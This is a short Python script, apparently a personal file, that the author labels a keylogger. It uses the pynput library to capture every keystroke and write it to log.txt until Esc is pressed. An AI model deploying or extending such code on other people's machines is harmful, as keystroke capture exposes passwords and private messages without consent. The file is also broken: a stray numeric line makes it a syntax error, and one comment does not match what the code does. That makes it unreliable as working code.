# -*- coding: utf-8 -*-
"""
Created on Fri Apr 16 20:31:25 2021

@author: DELL
"""

# keylogger using pynput module

import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
	
	keys.append(key)
	write_file(keys)
	
	try:
		print('alphanumeric key {0} pressed'.format(key.char))
		
	except AttributeError:
		print('special key {0} pressed'.format(key))
		
def write_file(keys):
	
	with open('log.txt', 'w') as f:
		for key in keys:
			
			# removing ''
			k = str(key).replace("'", "")
			f.write(k)
					
			# explicitly adding a space after
			# every keystroke for readability
			f.write("")
			
def on_release(key):
					
	print('{0} released'.format(key))
	if key == Key.esc:
		# Stop listener
		return False

5536123456789
with Listener(on_press = on_press,
			on_release = on_release) as listener:
					
	listener.join()
